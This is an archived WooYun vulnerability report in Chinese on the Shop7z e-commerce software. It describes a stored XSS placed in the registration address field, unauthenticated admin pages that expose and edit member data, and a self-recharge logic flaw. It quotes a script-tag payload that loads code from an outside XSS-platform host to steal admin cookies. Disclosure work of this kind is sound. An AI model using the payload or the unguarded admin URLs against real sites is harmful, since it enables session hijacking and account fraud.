{"id": 52244, "wybug_id": "wooyun-2014-071885", "wybug_title": "Shop7z多个漏洞大礼包", "wybug_corp": "Shop7z", "wybug_author": "LinE", "wybug_date": "2014-08-12 17:33", "wybug_open_date": "2014-09-26 17:34", "wybug_type": "应用配置错误", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["后台限制不严", "业务逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 前台存储型XSS打后台，后台限制不严导致敏感数据访问，自己给自己充值TAT，等等···· 详细说明：  0x01 前台XSS，使用官方最新的免费版源代码在注册用户的时候，地址当中输入XSS代码\"><script src=http://xsser.l1n3.net/WY6NN2?1407683427></script>如图\n\n然后注册，显示注册成功\n\n这时候查看一下后台---会员信息管理--会员管理---该会员详细信息\n\n可以看到xss代码已经插进去了而xss平台也能收到cookies信息\n\n0x02 未授权访问http://127.0.0.1/admin/huiyuandetail.asp?id=831该地址在免费版中未做权限检查，导致可以直接在这里遍历会员信息，同时可以修改任意会员信息相关代码huiyuandetail.asp中检查过了，无权限相关检查，包含的两个文件，一个conn中给了一个cookiesconn.asp\n8 m_user=session(\"m_user\")9 m_gold=session(\"m_gold\")\n另一个check4.asp是空文件，无用导致了未授权的访问，完全可以遍历用户信息\n\n0x03业务逻辑导致给自己充钱依然是之前的未授权访问，访问http://127.0.0.1/admin/Chongzhiadd.asp然后选择会员，我选择自己\n\n冲他个百八十万的，我也是土豪，嘎嘎，然后直接确定，查看充值记录\n\n\n\n好了，瞬间变土豪....还有一些其他的漏洞，暂时还没测试出来，等下一波再发吧   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：  一个商场代码写的如此不严谨，如何面对江东父老啊·····   版权声明：转载请注明来源 LinE@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}